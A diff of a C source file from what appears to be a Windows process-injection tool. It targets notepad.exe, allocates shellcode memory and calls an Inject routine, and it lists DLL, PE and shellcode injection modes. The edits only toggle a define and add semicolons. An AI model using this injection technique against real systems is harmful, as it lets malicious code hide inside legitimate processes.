@@ -29,7 +29,7 @@ extern Ade GlobalAde;
 #define TARGET_PROCNAME "notepad.exe"
 
 /* Conditional defines */
-#define CREATE_NEW_PROCESS     // Create a new process (the target process) for injection 
+// #define CREATE_NEW_PROCESS  // Create a new process (the target process) for injection 
 // #define DLL_INJECTION       // Inject a DLL (WORKING IN PROCESS)
 // #define PE_INJECTION        // Inject a PE  (WORKING IN PROCESS)
 // #define SHELLCODE_INJECTION // Inject a Shellcode (WORKING IN PROCESS)
@@ -93,8 +93,8 @@ int main() {
     );
 
     if (!hProcess) {
-        DEBUG_ERROR("OpenProcess: 0x%lx", GetLastError())
-        DEBUG_GETCHAR()
+        DEBUG_ERROR("OpenProcess: 0x%lx", GetLastError());
+        DEBUG_GETCHAR();
         return -1;
     }
 #endif
@@ -115,14 +115,14 @@ int main() {
     	shellcodeSize,
     	&memoryShellcodeAlloc
     )) {
-    	DEBUG_ERROR("FAILED ThreadNameAlloc")
+    	DEBUG_ERROR("FAILED ThreadNameAlloc");
     	return FALSE;
     }
 
     DEBUG_INFO("Execution Addr @ 0x%p", memoryShellcodeAlloc.executionAddr);
     Inject(hProcess, completionIoHandle, memoryShellcodeAlloc.executionAddr);
 
-    DEBUG_GETCHAR()
+    DEBUG_GETCHAR();
 
     return 0;
 }
